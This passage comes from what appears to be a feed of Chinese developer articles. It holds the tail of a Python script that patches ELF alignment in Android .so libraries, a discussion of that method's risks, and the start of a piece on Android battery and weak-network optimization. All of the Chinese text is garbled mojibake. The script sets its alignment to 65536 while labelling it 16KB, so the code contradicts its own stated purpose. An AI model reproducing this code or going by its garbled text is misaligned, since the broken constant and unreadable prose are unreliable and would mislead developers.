    <span class="hljs-string">"""Modify ELF file to use 16KB alignment"""</span>
    
    <span class="hljs-comment"># Read the entire file</span>
    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(filepath, <span class="hljs-string">'rb'</span>) <span class="hljs-keyword">as</span> f:
        data = <span class="hljs-built_in">bytearray</span>(f.read())
    
    <span class="hljs-comment"># Check ELF magic</span>
    <span class="hljs-keyword">if</span> data[:<span class="hljs-number">4</span>] != <span class="hljs-string">b'\x7fELF'</span>:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"Error: <span class="hljs-subst">{filepath}</span> is not an ELF file"</span>)
        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
    
    <span class="hljs-comment"># Get ELF class (32 or 64 bit)</span>
    ei_class = data[<span class="hljs-number">4</span>]
    <span class="hljs-keyword">if</span> ei_class == <span class="hljs-number">1</span>:  <span class="hljs-comment"># 32-bit</span>
        is_64bit = <span class="hljs-literal">False</span>
        phdr_size = <span class="hljs-number">32</span>
    <span class="hljs-keyword">elif</span> ei_class == <span class="hljs-number">2</span>:  <span class="hljs-comment"># 64-bit</span>
        is_64bit = <span class="hljs-literal">True</span>
        phdr_size = <span class="hljs-number">56</span>
    <span class="hljs-keyword">else</span>:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"Error: Unknown ELF class <span class="hljs-subst">{ei_class}</span>"</span>)
        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
    
    <span class="hljs-comment"># Get endianness</span>
    ei_data = data[<span class="hljs-number">5</span>]
    <span class="hljs-keyword">if</span> ei_data == <span class="hljs-number">1</span>:  <span class="hljs-comment"># Little endian</span>
        endian = <span class="hljs-string">'&lt;'</span>
    <span class="hljs-keyword">elif</span> ei_data == <span class="hljs-number">2</span>:  <span class="hljs-comment"># Big endian</span>
        endian = <span class="hljs-string">'&gt;'</span>
    <span class="hljs-keyword">else</span>:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"Error: Unknown endianness <span class="hljs-subst">{ei_data}</span>"</span>)
        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
    
    <span class="hljs-comment"># Read program header offset and count</span>
    <span class="hljs-keyword">if</span> is_64bit:
        e_phoff = struct.unpack(endian + <span class="hljs-string">'Q'</span>, data[<span class="hljs-number">32</span>:<span class="hljs-number">40</span>])[<span class="hljs-number">0</span>]
        e_phnum = struct.unpack(endian + <span class="hljs-string">'H'</span>, data[<span class="hljs-number">56</span>:<span class="hljs-number">58</span>])[<span class="hljs-number">0</span>]
    <span class="hljs-keyword">else</span>:
        e_phoff = struct.unpack(endian + <span class="hljs-string">'I'</span>, data[<span class="hljs-number">28</span>:<span class="hljs-number">32</span>])[<span class="hljs-number">0</span>]
        e_phnum = struct.unpack(endian + <span class="hljs-string">'H'</span>, data[<span class="hljs-number">44</span>:<span class="hljs-number">46</span>])[<span class="hljs-number">0</span>]
    
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"  ELF: <span class="hljs-subst">{<span class="hljs-string">'64-bit'</span> <span class="hljs-keyword">if</span> is_64bit <span class="hljs-keyword">else</span> <span class="hljs-string">'32-bit'</span>}</span>, <span class="hljs-subst">{e_phnum}</span> program headers at offset <span class="hljs-subst">{e_phoff}</span>"</span>)
    
    <span class="hljs-comment"># Process each program header</span>
    modified = <span class="hljs-literal">False</span>
    target_align = <span class="hljs-number">65536</span>  <span class="hljs-comment"># 16KB</span>
    
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(e_phnum):
        phdr_offset = e_phoff + i * phdr_size
        
        <span class="hljs-keyword">if</span> is_64bit:
            <span class="hljs-comment"># 64-bit program header</span>
            p_type = struct.unpack(endian + <span class="hljs-string">'I'</span>, data[phdr_offset:phdr_offset+<span class="hljs-number">4</span>])[<span class="hljs-number">0</span>]
            p_align_offset = phdr_offset + <span class="hljs-number">48</span>
            p_align = struct.unpack(endian + <span class="hljs-string">'Q'</span>, data[p_align_offset:p_align_offset+<span class="hljs-number">8</span>])[<span class="hljs-number">0</span>]
        <span class="hljs-keyword">else</span>:
            <span class="hljs-comment"># 32-bit program header</span>
            p_type = struct.unpack(endian + <span class="hljs-string">'I'</span>, data[phdr_offset:phdr_offset+<span class="hljs-number">4</span>])[<span class="hljs-number">0</span>]
            p_align_offset = phdr_offset + <span class="hljs-number">28</span>
            p_align = struct.unpack(endian + <span class="hljs-string">'I'</span>, data[p_align_offset:p_align_offset+<span class="hljs-number">4</span>])[<span class="hljs-number">0</span>]
        
        <span class="hljs-comment"># PT_LOAD = 1, PT_GNU_RELRO = 0x6474e552</span>
        <span class="hljs-keyword">if</span> p_type == <span class="hljs-number">1</span> <span class="hljs-keyword">or</span> p_type == <span class="hljs-number">0x6474e552</span>:
            <span class="hljs-keyword">if</span> p_align &lt; target_align:
                <span class="hljs-built_in">print</span>(<span class="hljs-string">f"    Program header <span class="hljs-subst">{i}</span>: type=<span class="hljs-subst">{<span class="hljs-built_in">hex</span>(p_type)}</span>, align=<span class="hljs-subst">{p_align}</span> -&gt; <span class="hljs-subst">{target_align}</span>"</span>)
                
                <span class="hljs-comment"># Update alignment</span>
                <span class="hljs-keyword">if</span> is_64bit:
                    struct.pack_into(endian + <span class="hljs-string">'Q'</span>, data, p_align_offset, target_align)
                <span class="hljs-keyword">else</span>:
                    struct.pack_into(endian + <span class="hljs-string">'I'</span>, data, p_align_offset, target_align)
                
                modified = <span class="hljs-literal">True</span>
    
    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> modified:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"  No modifications needed"</span>)
        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>
    
    <span class="hljs-comment"># Backup original file</span>
    backup_path = filepath + <span class="hljs-string">'.bak'</span>
    shutil.copy2(filepath, backup_path)
    
    <span class="hljs-comment"># Write modified data</span>
    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(filepath, <span class="hljs-string">'wb'</span>) <span class="hljs-keyword">as</span> f:
        f.write(data)
    
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"  \u2713 Modified and saved (backup: <span class="hljs-subst">{backup_path}</span>)"</span>)
    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>

<span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():
    <span class="hljs-comment"># Example: List of libraries to align</span>
    libs_to_align = [
        <span class="hljs-comment"># "path/to/your/lib.so",</span>
    ]
    
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"=== Starting 16KB ELF alignment ===\n"</span>)
    
    success_count = <span class="hljs-number">0</span>
    <span class="hljs-keyword">for</span> lib <span class="hljs-keyword">in</span> libs_to_align:
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(lib):
            <span class="hljs-built_in">print</span>(<span class="hljs-string">f"ERROR: <span class="hljs-subst">{lib}</span> not found\n"</span>)
            <span class="hljs-keyword">continue</span>
        
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"Processing: <span class="hljs-subst">{lib}</span>"</span>)
        <span class="hljs-keyword">if</span> align_elf_to_16kb(lib):
            success_count += <span class="hljs-number">1</span>
        <span class="hljs-built_in">print</span>()
    
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"=== Completed: <span class="hljs-subst">{success_count}</span>/<span class="hljs-subst">{<span class="hljs-built_in">len</span>(libs_to_align)}</span> files processed ==="</span>)
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span> <span class="hljs-keyword">if</span> success_count == <span class="hljs-built_in">len</span>(libs_to_align) <span class="hljs-keyword">else</span> <span class="hljs-number">1</span>

<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:
    sys.exit(main())

</code></pre>
<ul>
<li><strong>ä¼˜ç‚¹</strong>ï¼šç®€å•ã€å¿«é€Ÿï¼Œæ— éœ€æ¥è§¦å¤æ‚çš„æ„å»ºç³»ç»Ÿã€‚å¯¹äºå¤„ç†æ²¡æœ‰æºç çš„ç¬¬ä¸‰æ–¹åº“å°¤å…¶æœ‰æ•ˆã€‚</li>
<li><strong>ç¼ºç‚¹</strong>ï¼šè¿™æ˜¯ä¸€ç§â€œå¦¥åâ€çš„æ–¹æ¡ˆï¼Œå®ƒå¹¶éæ²¡æœ‰é£é™©ã€‚</li>
</ul>
<h2 data-id="heading-4">è„šæœ¬ä¿®å¤æ–¹æ³•çš„æ½œåœ¨é£é™©</h2>
<p>è™½ç„¶è„šæœ¬æ–¹æ³•å¾ˆæ–¹ä¾¿ï¼Œä½†å®ƒåŸºäºä¸€ä¸ªé‡è¦çš„<strong>å‡è®¾</strong>ï¼Œå¦‚æœå‡è®¾ä¸æˆç«‹ï¼Œåˆ™å¯èƒ½å¼•å…¥ä¸¥é‡é—®é¢˜ã€‚</p>
<h3 data-id="heading-5">1. æ ¸å¿ƒæŠ€æœ¯é£é™©ï¼šç ´å ELF æ–‡ä»¶çš„ä¸€è‡´æ€§</h3>
<p>ELF æ ¼å¼æœ‰ä¸€ä¸ªå¼ºåˆ¶æ€§è§„åˆ™ï¼š<strong>æ®µçš„è™šæ‹Ÿåœ°å€ï¼ˆ<code>p_vaddr</code>ï¼‰å’Œæ–‡ä»¶åç§»ï¼ˆ<code>p_offset</code>ï¼‰åœ¨å¯¹é½å€¼ï¼ˆ<code>p_align</code>ï¼‰ä¸‹å¿…é¡»åŒä½™</strong>ã€‚å³ï¼š
<code>p_vaddr % p_align == p_offset % p_align</code></p>
<p>è„šæœ¬å¼ºè¡Œå¢å¤§äº† <code>p_align</code> çš„å€¼ï¼Œå®ƒ<strong>å‡è®¾</strong>åœ¨æ­¤ä¹‹åä¸Šè¿°ç­‰å¼ä¾ç„¶æˆç«‹ã€‚å¯¹äºç”±æ ‡å‡†å·¥å…·é“¾ï¼ˆå¦‚ NDK è‡ªå¸¦çš„ï¼‰ç”Ÿæˆçš„ <code>.so</code> æ–‡ä»¶ï¼Œè¿™ä¸ªå‡è®¾é€šå¸¸æ˜¯æˆç«‹çš„ã€‚</p>
<p>ä½†æ˜¯ï¼Œå¦‚æœ <code>.so</code> æ–‡ä»¶æ˜¯ç”±ä¸€ä¸ªè¡Œä¸ºå¼‚å¸¸æˆ–éæ ‡å‡†çš„å·¥å…·é“¾ç”Ÿæˆçš„ï¼Œè¿™ä¸ªç­‰å¼å¯èƒ½è¢«ç ´åã€‚å…¶åæœæ˜¯ç¾éš¾æ€§çš„ï¼š<strong>ç³»ç»ŸåŠ è½½å™¨ï¼ˆdynamic linkerï¼‰åœ¨åŠ è½½ <code>.so</code> æ–‡ä»¶æ—¶ä¼šæ£€æµ‹åˆ°è¿™ä¸ªä¸ä¸€è‡´ï¼Œå¹¶æ‹’ç»åŠ è½½å®ƒï¼Œæœ€ç»ˆå¯¼è‡´åº”ç”¨å¯åŠ¨æ—¶ç›´æ¥å´©æºƒï¼ˆé€šå¸¸è¡¨ç°ä¸º <code>dlopen failed</code> é”™è¯¯ï¼‰</strong>ã€‚</p>
<h3 data-id="heading-6">2. æµç¨‹ä¸ç»´æŠ¤é—®é¢˜</h3>
<ul>
<li><strong>å¥å£®æ€§å·®</strong>ï¼šå®ƒæˆä¸ºæ„å»ºæµç¨‹ä¸­ä¸€ä¸ªç‹¬ç«‹ã€æ˜“è¢«å¿½ç•¥çš„æ­¥éª¤ã€‚å¦‚æœå¼€å‘è€…å¿˜è®°è¿è¡Œï¼Œå¯¹é½å°†ä¸ä¼šç”Ÿæ•ˆã€‚</li>
<li><strong>é€æ˜åº¦ä½</strong>ï¼šé¡¹ç›®çš„æ ¸å¿ƒæ„å»ºé…ç½®å¹¶æœªåæ˜ å‡º 16KB å¯¹é½çš„é€»è¾‘ï¼Œç»™æ–°åŠ å…¥çš„å¼€å‘è€…ç†è§£å’Œç»´æŠ¤é¡¹ç›®å¸¦æ¥äº†éšœç¢ã€‚</li>
</ul>
<h3 data-id="heading-7">3. ç ´åä»£ç ç­¾å</h3>
<p>å¦‚æœä½ çš„å‘å¸ƒæµç¨‹åŒ…å«ä»£ç ç­¾åï¼ˆCode Signingï¼‰ï¼Œé‚£ä¹ˆè„šæœ¬å¯¹ <code>.so</code> æ–‡ä»¶çš„ä»»ä½•ä¿®æ”¹éƒ½ä¼šä½¿åŸå§‹ç­¾åå¤±æ•ˆã€‚æ­£ç¡®çš„æµç¨‹åº”è¯¥æ˜¯ï¼š<strong>ç¼–è¯‘ -&gt; è¿è¡Œå¯¹é½è„šæœ¬ -&gt; é‡æ–°ç­¾å</strong>ã€‚</p>
<h2 data-id="heading-8">ç»“è®ºä¸å»ºè®®</h2>























<table><thead><tr><th align="left">æ–¹æ³•</th><th align="left">ä¼˜ç‚¹</th><th align="left">ç¼ºç‚¹</th><th align="left">é€‚ç”¨åœºæ™¯</th></tr></thead><tbody><tr><td align="left"><strong>åŸç”Ÿç¼–è¯‘</strong></td><td align="left">å½»åº•ã€è§„èŒƒã€æ— é£é™©</td><td align="left">ä¿®æ”¹æ„å»ºç³»ç»Ÿå¯èƒ½å¤æ‚</td><td align="left">æ‹¥æœ‰å®Œæ•´æºç å’Œæ„å»ºæ§åˆ¶æƒçš„é¡¹ç›®</td></tr><tr><td align="left"><strong>è„šæœ¬ä¿®å¤</strong></td><td align="left">ç®€å•ã€å¿«é€Ÿã€çµæ´»</td><td align="left">å­˜åœ¨ç ´åæ–‡ä»¶ä¸€è‡´æ€§çš„é£é™©ã€å½±å“æµç¨‹</td><td align="left">ç¬¬ä¸‰æ–¹åº“ã€è€æ—§é¡¹ç›®ã€å¿«é€ŸéªŒè¯</td></tr></tbody></table>
<p><strong>æœ€ç»ˆå»ºè®®</strong>ï¼š</p>
<ol>
<li><strong>é¦–é€‰åŸç”Ÿç¼–è¯‘</strong>ï¼šå¦‚æœä½ çš„é¡¹ç›®å…è®¸ï¼Œåº”ä¼˜å…ˆé€‰æ‹©é€šè¿‡ä¿®æ”¹ç¼–è¯‘å™¨é…ç½®æ¥åŸç”Ÿæ”¯æŒ 16KB å¯¹é½ã€‚è¿™æ˜¯æœ€ç¨³å¦¥çš„é•¿æœŸæ–¹æ¡ˆã€‚</li>
<li><strong>è°¨æ…ä½¿ç”¨è„šæœ¬</strong>ï¼šè„šæœ¬æ˜¯ä¸€ä¸ªéå¸¸å‡ºè‰²çš„â€œæˆ˜æœ¯â€å·¥å…·ï¼Œå°¤å…¶é€‚åˆå¤„ç†å¤–éƒ¨ä¾èµ–å’Œå¤æ‚é—ç•™é¡¹ç›®ã€‚ä½†å®ƒæ˜¯ä¸€ç§å¦¥åï¼Œè€Œéâ€œé“¶å¼¹â€ã€‚</li>
<li><strong>æµ‹è¯•æ˜¯å…³é”®</strong>ï¼šæ— è®ºä½ é€‰æ‹©å“ªç§æ–¹æ³•ï¼Œ<strong>éƒ½å¿…é¡»åœ¨ç›®æ ‡è®¾å¤‡ï¼ˆç‰¹åˆ«æ˜¯é‚£äº›å·²çŸ¥ä½¿ç”¨ 16KB é¡µé¢çš„è®¾å¤‡ï¼‰ä¸Šè¿›è¡Œå……åˆ†ã€ä¸¥æ ¼çš„æµ‹è¯•</strong>ï¼Œç¡®ä¿åº”ç”¨çš„å¯åŠ¨å’Œæ ¸å¿ƒåŠŸèƒ½å®Œå…¨æ­£å¸¸ã€‚å¯¹äºè„šæœ¬ä¿®å¤æ³•ï¼Œè¿™ä¸€æ­¥å°¤å…¶é‡è¦ï¼Œæ˜¯é˜²èŒƒåŠ è½½å¤±è´¥é£é™©çš„æœ€åä¸€é“é˜²çº¿ã€‚</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ç¨³å®šæ€§æ€§èƒ½ç³»åˆ—ä¹‹åå››â€”â€”ç”µé‡ä¸ç½‘ç»œä¼˜åŒ–:Battery Historianä¸å¼±ç½‘å¤„ç†å®æˆ˜]]></title>    <link>https://juejin.cn/post/7595021656428429339</link>    <guid>https://juejin.cn/post/7595021656428429339</guid>    <pubDate>2026-01-14T13:24:23.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595021656428429339" data-draft-id="7595021656428412955" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ç¨³å®šæ€§æ€§èƒ½ç³»åˆ—ä¹‹åå››â€”â€”ç”µé‡ä¸ç½‘ç»œä¼˜åŒ–:Battery Historianä¸å¼±ç½‘å¤„ç†å®æˆ˜"/> <meta itemprop="keywords" content="Android,æ€§èƒ½ä¼˜åŒ–,Debug"/> <meta itemprop="datePublished" content="2026-01-14T13:24:23.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å†¬å¥‡Lab"/> <meta itemprop="url" content="https://juejin.cn/user/1857501105781193"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ç¨³å®šæ€§æ€§èƒ½ç³»åˆ—ä¹‹åå››â€”â€”ç”µé‡ä¸ç½‘ç»œä¼˜åŒ–:Battery Historianä¸å¼±ç½‘å¤„ç†å®æˆ˜
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1857501105781193/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å†¬å¥‡Lab
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-14T13:24:23.000Z" title="Wed Jan 14 2026 13:24:23 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-14
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»9åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">å¼•è¨€</h2>
<p>ä½ æœ‰æ²¡æœ‰é‡åˆ°è¿‡è¿™æ ·çš„åœºæ™¯:ç”¨æˆ·æŠ•è¯‰è¯´ã€Œä½ ä»¬çš„Appå¤ªè€—ç”µäº†,åŠå¤©å°±æŠŠæˆ‘æ‰‹æœºç”µç”¨å®Œäº†ã€,æˆ–è€…ã€Œç½‘ç»œä¸å¥½çš„æ—¶å€™ä½ ä»¬çš„Appæ ¹æœ¬ç”¨ä¸äº†ã€ã€‚ä½œä¸ºå¼€å‘è€…,è¿™ä¸¤ä¸ªé—®é¢˜å¯èƒ½æ˜¯ç”¨æˆ·ä½“éªŒæ€æ‰‹ä¸­æœ€è‡´å‘½çš„â€”â€”ç”µé‡å’Œç½‘ç»œã€‚</p>
<p>ç”µé‡ä¼˜åŒ–å’Œç½‘ç»œä¼˜åŒ–çœ‹ä¼¼æ˜¯ä¸¤ä¸ªç‹¬ç«‹çš„ä¸»é¢˜,ä½†å®ƒä»¬æœ‰ç€å¯†åˆ‡çš„å…³ç³»:<strong>ç½‘ç»œè¯·æ±‚æ˜¯ç§»åŠ¨è®¾å¤‡æœ€å¤§çš„ç”µé‡æ¶ˆè€—æºä¹‹ä¸€</strong>ã€‚ä¸€ä¸ªç³Ÿç³•çš„ç½‘ç»œç­–ç•¥ä¸ä»…è®©ç”¨æˆ·ä½“éªŒå˜å·®,è¿˜ä¼šç–¯ç‹‚åƒæ‰æ‰‹æœºç”µé‡ã€‚</p>
<p>ä»Šå¤©è¿™ç¯‡æ–‡ç« ,æˆ‘ä¼šå¸¦ä½ æ·±å…¥Androidçš„ç”µé‡ç®¡ç†æœºåˆ¶,æ•™ä½ ç”¨Battery Historianè¿™ä¸ªç¥å™¨åˆ†æç”µé‡æ¶ˆè€—,ç†è§£Dozeæ¨¡å¼å’ŒWakelockçš„ä¼˜åŒ–æŠ€å·§,å¹¶åˆ†äº«å¼±ç½‘ç¯å¢ƒä¸‹çš„å®æˆ˜ä¼˜åŒ–æ–¹æ¡ˆã€‚è¯»å®Œè¿™ç¯‡æ–‡ç« ,ä½ å°†æŒæ¡:</p>
<ul>
<li>Androidç”µé‡ç®¡ç†çš„æ ¸å¿ƒæœºåˆ¶(Dozeã€App Standby)</li>
<li>Battery Historianå·¥å…·çš„å®Œæ•´ä½¿ç”¨æµç¨‹</li>
<li>Wakelockæ»¥ç”¨æ£€æµ‹å’Œä¼˜åŒ–æ–¹æ³•</li>
<li>å¼±ç½‘ç¯å¢ƒè¯†åˆ«å’Œä¼˜åŒ–ç­–ç•¥</li>
<li>ç½‘ç»œè¯·æ±‚çš„æœ€ä½³å®è·µ</li>
</ul>
<p>å‡†å¤‡å¥½äº†å—?è®©æˆ‘ä»¬å¼€å§‹è¿™åœºã€Œçœç”µåˆæµç•…ã€çš„ä¼˜åŒ–ä¹‹æ—…!</p>
<h2 data-id="heading-1">Androidç”µé‡ç®¡ç†æœºåˆ¶</h2>
<h3 data-id="heading-2">ç”µé‡æ¶ˆè€—çš„ä¸»è¦æ¥æº</h3>
<p>åœ¨ä¼˜åŒ–ç”µé‡ä¹‹å‰,æˆ‘ä»¬å…ˆè¦çŸ¥é“ç”µéƒ½å»å“ªå„¿äº†ã€‚Androidè®¾å¤‡çš„ç”µé‡æ¶ˆè€—ä¸»è¦æ¥è‡ª:</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/949f3b2ba3264ba6a8b0220985e87fbe~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Yas5aWHTGFi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769001863&amp;x-signature=RtbnRGkgKU9rk2nxZIO6y3HyFZ0%3D" alt="14-01-battery-consumption.png" loading="lazy"/></p>
<p>å¯¹äºåº”ç”¨å¼€å‘è€…æ¥è¯´,æˆ‘ä»¬èƒ½ä¼˜åŒ–çš„ä¸»è¦æ˜¯<strong>ç½‘ç»œé€šä¿¡ã€CPUè¿ç®—ã€å®šä½æœåŠ¡</strong>è¿™ä¸‰å¤§å—ã€‚è€Œç½‘ç»œä¼˜åŒ–åˆæ˜¯é‡ä¸­ä¹‹é‡,å› ä¸ºä¸€æ¬¡ç½‘ç»œè¯·æ±‚ä¼šåŒæ—¶æ¶ˆè€—<strong>ç½‘ç»œæ¨¡å—å’ŒCPU</strong>çš„ç”µé‡ã€‚</p>
<h3 data-id="heading-3">PowerManagerä¸ç”µæºç®¡ç†æœåŠ¡</h3>
<p>Androidçš„ç”µæºç®¡ç†ç”±<code>PowerManager</code>ç³»ç»ŸæœåŠ¡è´Ÿè´£ã€‚å®ƒæä¾›äº†å¤šç§ç”µæºçŠ¶æ€:</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">val</span> powerManager = getSystemService(Context.POWER_SERVICE) <span class="hljs-keyword">as</span> PowerManager

<span class="hljs-comment">// æ£€æŸ¥è®¾å¤‡æ˜¯å¦å¤„äºçœç”µæ¨¡å¼</span>
<span class="hljs-keyword">val</span> isPowerSaveMode = powerManager.isPowerSaveMode

<span class="hljs-comment">// æ£€æŸ¥æ˜¯å¦å¤„äºDozeæ¨¡å¼</span>
<span class="hljs-keyword">val</span> isDeviceIdleMode = powerManager.isDeviceIdleMode

<span class="hljs-comment">// æ£€æŸ¥åº”ç”¨æ˜¯å¦è¢«é™åˆ¶åå°æ´»åŠ¨</span>
<span class="hljs-keyword">val</span> isIgnoringBatteryOptimizations = powerManager.isIgnoringBatteryOptimizations(packageName)
</code></pre>
<h3 data-id="heading-4">Dozeæ¨¡å¼:æ·±åº¦ç¡çœ çš„è‰ºæœ¯</h3>
<p>Dozeæ¨¡å¼æ˜¯Android 6.0å¼•å…¥çš„é‡ç£…åŠŸèƒ½,ç›®çš„æ˜¯åœ¨è®¾å¤‡é•¿æ—¶é—´é™ç½®æ—¶è¿›å…¥<strong>æ·±åº¦ç¡çœ </strong>,æå¤§é™ä½ç”µé‡æ¶ˆè€—ã€‚</p>
<h4 data-id="heading-5">Dozeæ¨¡å¼è§¦å‘æ¡ä»¶</h4>
